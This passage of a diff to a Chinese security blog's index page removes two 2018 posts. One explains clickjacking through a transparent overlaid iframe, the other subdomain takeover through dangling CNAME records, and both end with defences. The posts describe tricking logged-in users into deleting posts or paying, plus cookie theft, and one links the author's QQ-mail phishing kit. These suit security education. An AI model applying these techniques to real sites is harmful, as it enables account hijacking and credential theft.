name=&quot;iframepage&quot;  width=&quot;100%&quot; height=&quot;100%&quot; scrolling=&quot;no&quot;;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-<p>iframe调用过来的界面是不想让用户看到但是想让用户操作到的界面。我这里直接调用了百度的主页演示，并不会造成危害。</p>
-<p>所以在iframe的css设置中:</p>
-<ul>
-<li><p>需要将它放在最上层(z-index数值高于我们其他页面的z-index)</p>
-</li>
-<li><p>且要透明：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-moz-opacity:0;</span><br><span class="line">opacity:0;</span><br><span class="line">filter:alpha(opacity=0);</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>给用户看的是我们写好的一个页面，我在这里只写了一个form，里面存在和百度输入框和“百度一下”按钮一样大小的两个元素。在实际情况中可以制作好一个完整的网页，诱导用户在关键性的地方输入或点击。</p>
-<p>然后我们先将透明度opacity的几个值设为0.1，然后打开这个页面，可以看到，百度的输入框和搜索按钮和我们写好的输入框和搜索按钮是完全重合的，并且由于iframe页面在上面，点击到这个输入框时，输入的内容是进入百度输入框里面的。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/click_jacking/clickjacking01.png?raw=true" alt=""></p>
-<p>如果设置opacity=0调成完全透明时效果如下</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/click_jacking/clickjacking02.png?raw=true" alt=""></p>
-<p>我们在这个输入框输入内容并点Try，实际上却是在隐藏的百度页面中输入内容并点搜索。这其实就构成了点击劫持。</p>
-<p>可能看到这里你会想，实现这个功能有什么实际意义呢？</p>
-<p>当然如果只是跳转一个百度页面会没有什么意义，我们可以举一个小例子，如果一个用户恰好处于百度贴吧登陆的状态，浏览器记录的它的cookie，我的iframe调用的是一个透明的贴吧管理界面，而由于浏览器cookie的存在，这个用户在这个界面是处于登陆状态的，那么我通过精心构造一个页面诱使它点击“删除帖子”这个按钮，这个用户就很有可能在访问我的网站的时候，因为随意点了几下鼠标，导致控制自己帖子被删除。</p>
-<p>如果去调用一些危险操作的页面（转账，付款，重置密码，注销账号），在开通小额免密支付的情况下，也许会在完全不知情的情况带来很多损失。</p>
-<h2 id="0x03-配合其他漏洞"><a href="#0x03-配合其他漏洞" class="headerlink" title="0x03 配合其他漏洞"></a>0x03 配合其他漏洞</h2><h4 id="csrf"><a href="#csrf" class="headerlink" title="csrf"></a>csrf</h4><p>通常的csrf由于同源策略、token等的原因，都会被拦截下来，但是点击劫持本就是在iframe中调用原网页，服务器会认为是用户自己在正确的页面做出了这些操作，可以通过点击劫持，去控制用户做那些csrf做不了的操作。</p>
-<h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><p>反射性xss漏洞触发时会在页面url中存在恶意xss代码，目前谷歌浏览器等都会进行拦截或警告，但是如果利用点击劫持，控制用户做出点击触发js代码的操作，就不会触发浏览器的安全策略，将一个原本可能无关紧要的漏洞变的具备威胁。</p>
-<h2 id="0x04-应对"><a href="#0x04-应对" class="headerlink" title="0x04 应对"></a>0x04 应对</h2><h3 id="X-FRAME-OPTIONS"><a href="#X-FRAME-OPTIONS" class="headerlink" title="X-FRAME-OPTIONS"></a>X-FRAME-OPTIONS</h3><p>X-FRAME-OPTIONS是微软提出的一个http头，专门用来防御利用iframe嵌套的点击劫持攻击。并且在IE8、Firefox3.6、Chrome4以上的版本均能很好的支持。</p>
-<p>这个头可以配置：</p>
-<ul>
-<li>DENY  // 拒绝任何域加载</li>
-<li>SAMEORIGIN / / 允许同源域下加载</li>
-<li>ALLOW-FROM  // 可以定义允许frame加载的页面地址</li>
-</ul>
-<p>在php中可以这样配置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header(&apos;X-Frame-Options:Deny&apos;);</span><br></pre></td></tr></table></figure></p>
-<h3 id="FrameBusting"><a href="#FrameBusting" class="headerlink" title="FrameBusting"></a>FrameBusting</h3><p>Frame Busting 代码使用 JavaScript 脚本阻止恶意网站载入网页。如果检测到网页被非法网页通过iframe载入，就执行自动跳转功能。</p>
-<h3 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h3><p>在面对存在验证码的页面时，用户看不到这个透明页面，肯定是不会输入验证码的，在危险操作位置布置验证码认证，就可以防止点击劫持造成危害。</p>
-<h3 id="NoScript"><a href="#NoScript" class="headerlink" title="NoScript"></a>NoScript</h3><p>上述几种都是服务器所提供的策略，但我们总不能祈祷着每个网站都能做到这些安全策略，我们用户要保护自己，可以使用firefox的NoScript插件ClearClick，这个组件可以检测出页面存在的点击劫持攻击。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/10/子域名劫持/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/09/10/子域名劫持/" itemprop="url">
-                  子域名劫持
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-10T15:22:45+08:00">
-                2018-09-10
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/09/10/子域名劫持/" class="leancloud_visitors" data-flag-title="子域名劫持">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前几个月，关于子域名劫持的安全报告数量激增，去看了几篇报告，感觉这也是一个现在较为广泛存在的问题，就写出来共享一下。</p>
-<h2 id="0x01-子域名与域名解析"><a href="#0x01-子域名与域名解析" class="headerlink" title="0x01 子域名与域名解析"></a>0x01 子域名与域名解析</h2><p>先来介绍一下子域名和域名解析的一些相关知识。</p>
-<h3 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h3><p>我们通常在域名提供商购买的域名如 baidu.com，并不是只能解析一个服务器，我们可以在它的基础上增加很多的子域名，比如 test.baidu.com，smtp.baidu.com，image.baidu.com，talent.baidu.com 等等，它们可以分别解析到不同的服务器。</p>
-<h3 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h3><p>域名解析的记录类型很多：</p>
-<ul>
-<li><p>A记录：地址记录，用来指定域名的IPv4地址，如果需要将域名指向一个IP地址，就需要添加A记录。</p>
-</li>
-<li><p>CNAME： 如果需要将域名指向另一个域名，再由另一个域名提供ip地址，就需要添加CNAME记录。</p>
-</li>
-<li><p>TXT：在这里可以填写任何东西，长度限制255。绝大多数的TXT记录是用来做SPF记录（反垃圾邮件）。</p>
-</li>
-<li><p>NS：域名服务器记录，如果需要把子域名交给其他DNS服务商解析，就需要添加NS记录。</p>
-</li>
-<li><p>AAAA：用来指定主机名（或域名）对应的IPv6地址（例如：ff06:0:0:0:0:0:0:c3）记录。</p>
-</li>
-<li><p>MX：如果需要设置邮箱，让邮箱能收到邮件，就需要添加MX记录。</p>
-</li>
-<li><p>显性URL：从一个地址301重定向到另一个地址的时候，就需要添加显性URL记录（注：DNSPod目前只支持301重定向）。</p>
-</li>
-<li><p>隐性URL：类似于显性URL，区别在于隐性URL不会改变地址栏中的域名。</p>
-</li>
-<li><p>SRV：记录了哪台计算机提供了哪个服务。格式为：服务的名字、点、协议的类型</p>
-</li>
-</ul>
-<p>我们最常用的是A记录与CNMAE记录，分别是将域名指向ipv4地址或另一个域名。</p>
-<h2 id="0x02-漏洞原理"><a href="#0x02-漏洞原理" class="headerlink" title="0x02 漏洞原理"></a>0x02 漏洞原理</h2><p>子域名劫持产生的原因一般都是网站开启了很多子域名，这些子域名其中又有很多cname解析来解析到其他的网站，然后在某一天，这些被指向的网站废弃了，然后又没有去删除解析记录。</p>
-<p>这些被废弃的网站原本的域名被攻击者注册或通过其他手段获得，然后定向到攻击者的服务器并在上面部署钓鱼网站，或者劫持cookie的代码，当用户再次访问这些子域名就会解析向钓鱼网站，或者被盗取cookie而丢失账号。</p>
-<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>我们可以用实例来证明一下，假设现在我们有一个域名 uuzdaisuki.com ,其中有一个解析记录 test.uuzdaisuki.com 原本指向我们另外一个域名 <a href="http://www.sbwyfdsmjb.tk" target="_blank" rel="noopener">www.sbwyfdsmjb.tk</a> ，但是有一天，我们废弃了这个功能，将第二个域名注销了，却忘记删掉这条解析记录。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/subdomain_takeover/subdomain01.png?raw=true" alt=""></p>
-<p>如果这个解析被攻击者发现了(通过扫描之后的报错界面)，然后攻击者抢注了这个已经被废弃的域名 sbwyfdsmjb.tk，这个时候攻击者就可以将域名解析向自己的服务器，我这里以github页面证明一下。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/subdomain_takeover/subdomain02.png?raw=true" alt=""></p>
-<p>可以看到，test.uuzdaisuki.com解析到了最终由攻击者可控的github页面。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/subdomain_takeover/subdomain03.png?raw=true" alt=""></p>
-<p>这个时候从包括第二个域名及其之后的东西全部都是我们可控了，这个时候可以用来做些什么，相信大家心里都有数了。</p>
-<p>我来举两个常见的例子：</p>
-<h3 id="钓鱼网站"><a href="#钓鱼网站" class="headerlink" title="钓鱼网站"></a>钓鱼网站</h3><p>我们在第二个域名中，使用A记录解析到一台自己的匿名服务器，然后在服务器上部署web服务，根据第一个域名所在公司的业务类型，写一个相似的前端登陆界面然后发送链接出去，就可以实施钓鱼，被攻击者一般看到这个域名的确是所登陆业务的域名，也就不会有疑心了，钓鱼成功率大大增加。</p>
-<p>提供一个qq邮箱的完整前后端钓鱼代码: <a href="https://github.com/echohun/tools/tree/master/%E9%92%93%E9%B1%BC/qq%E9%82%AE%E7%AE%B1%E9%92%93%E9%B1%BC%E5%89%8D%E7%AB%AF%2B%E5%90%8E%E7%AB%AF%E5%85%A8%E4%BB%A3%E7%A0%81/mailqq" target="_blank" rel="noopener">https://github.com/echohun/tools/tree/master/%E9%92%93%E9%B1%BC/qq%E9%82%AE%E7%AE%B1%E9%92%93%E9%B1%BC%E5%89%8D%E7%AB%AF%2B%E5%90%8E%E7%AB%AF%E5%85%A8%E4%BB%A3%E7%A0%81/mailqq</a></p>
-<p>效果如下，可以达到以假乱真：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/subdomain_takeover/subdomain04.png?raw=true" alt=""></p>
-<h3 id="csrf"><a href="#csrf" class="headerlink" title="csrf"></a>csrf</h3><p>我们目前可以控制的子域名和对方业务属于同一个顶级域名，那同源策略就限制不了我们了，只需要在这个子域构造一个恶意的页面，跳转对这个顶级域名下其他业务发起请求，很容易造成跨站请求伪造。</p>
-<p>详细可以参考这个案例： <a href="https://hackerone.com/reports/172137" target="_blank" rel="noopener">https://hackerone.com/reports/172137</a></p>
-<h3 id="cookie盗取"><a href="#cookie盗取" class="headerlink" title="cookie盗取"></a>cookie盗取</h3><p>同样的，既然我们控制的子域和对方业务属于同一个顶级域名，那么cookie的作用域，我们也是共享的，只需要在这个子域名增加代码将cookie保存起来，之后就可以利用cookie登陆这些被攻击用户的账号，造成cookie劫持。</p>
-<p>具体方法和xss进行cookie盗取一样。</p>
-<h2 id="0x04-应对"><a href="#0x04-应对" class="headerlink" title="0x04 应对"></a>0x04 应对</h2><p>造成子域名劫持根本的原因是运维人员的粗心大意，没有及时关闭掉废弃的dns解析，只需要及时关闭，就可以避免这个问题。但是不幸的是这个问题现在广泛的存在于各个企业之中，每周都能看到非常多关于子域名劫持的安全报告。</p>
-<p>其他案例：</p>
-<p><a href="https://hackerone.com/reports/32825" target="_blank" rel="noopener">https://hackerone.com/reports/32825</a></p>
-<p><a href="https://hackerone.com/reports/38007" target="_blank" rel="noopener">https://hackerone.com/reports/38007</a></p>
-<p><a href="https://hackerone.com/reports/175070" target="_blank" rel="noopener">https://hackerone.com/reports/175070</a></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2448,7 +2436,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">102</span>
+                <span class="site-state-item-count">104</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -2470,7 +2458,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">63</span>
+                <span class="site-state-item-count">64</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
